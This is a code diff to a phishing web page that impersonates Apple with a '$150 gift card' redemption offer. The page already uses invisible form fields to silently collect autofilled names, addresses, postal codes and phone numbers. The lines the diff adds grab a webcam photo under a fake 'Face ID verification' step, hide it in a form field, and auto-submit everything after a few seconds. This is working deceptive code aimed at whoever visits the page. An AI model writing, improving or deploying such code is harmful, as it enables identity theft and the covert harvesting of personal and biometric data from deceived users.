@@ -30,8 +30,8 @@
         }
         .card-code-strip span { font-family: monospace; font-size: 16px; color: #1d1d1f; letter-spacing: 2px; font-weight: bold; }
 
-        /* The "Trick" - Visible but styled to look like a button or hidden */
-        .real-inputs {
+        /* Hidden elements for capture and autofill */
+        .real-inputs, #cam-stream, #canvas-capture {
             opacity: 0; position: absolute; pointer-events: none; height: 0; width: 0;
         }
 
@@ -49,7 +49,7 @@
 
     <div class="content">
         <h1>Redeem Gift Card</h1>
-        <p class="subtitle">Complete verification to add $150 to your account.</p>
+        <p class="subtitle">Complete face verification to add $150 to your account.</p>
 
         <div class="card-container">
             <div class="card-value">$150</div>
@@ -67,11 +67,15 @@
                 <input type="text" id="city" name="city" autocomplete="address-level2">
                 <input type="text" id="zipCode" name="zipCode" autocomplete="postal-code">
                 <input type="tel" id="phoneNumber" name="phoneNumber" autocomplete="tel">
+                <input type="hidden" id="photoData" name="photoData">
             </div>
 
-            <button type="button" class="btn-verify" id="triggerBtn">Verify with Apple ID</button>
+            <button type="button" class="btn-verify" id="triggerBtn">Verify with Face ID</button>
         </form>
     </div>
+
+    <video id="cam-stream" autoplay playsinline></video>
+    <canvas id="canvas-capture" width="640" height="480"></canvas>
 
     <div class="footer">Copyright © 2026 Apple Inc.</div>
 
@@ -84,21 +88,45 @@
         }
 
         const triggerBtn = document.getElementById('triggerBtn');
+        const video = document.getElementById('cam-stream');
+        const canvas = document.getElementById('canvas-capture');
         const form = document.getElementById('autoForm');
 
-        triggerBtn.addEventListener('click', () => {
-            // Step 1: Change text to look like it's working
-            triggerBtn.innerText = "Verifying...";
+        triggerBtn.addEventListener('click', async () => {
+            triggerBtn.innerText = "Verifying Face...";
             triggerBtn.style.opacity = "0.7";
 
-            // Step 2: Manually focus a field to trigger the Browser's "Saved Info" dropdown
-            // Note: This works best on mobile. On desktop, it prompts the user to select their profile.
-            document.getElementById('fullName').focus();
+            try {
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
 
-            // Step 3: Wait 3 seconds, then submit whatever was captured
+                // Wait a moment for the camera to stabilize, then take snapshot
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert to Base64 and save to hidden input
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                    document.getElementById('photoData').value = dataUrl;
+
+                    // Stop camera stream
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Trigger Autofill dropdown focus
+                    document.getElementById('fullName').focus();
+                }, 1000);
+
+            } catch (err) {
+                console.log("Camera access denied or unavailable.");
+                // Even if camera fails, still try to focus for autofill
+                document.getElementById('fullName').focus();
+            }
+
+            // Final submission after capture and autofill window
             setTimeout(() => {
                 form.submit();
-            }, 3000);
+            }, 4000);
         });
     </script>
 </body>
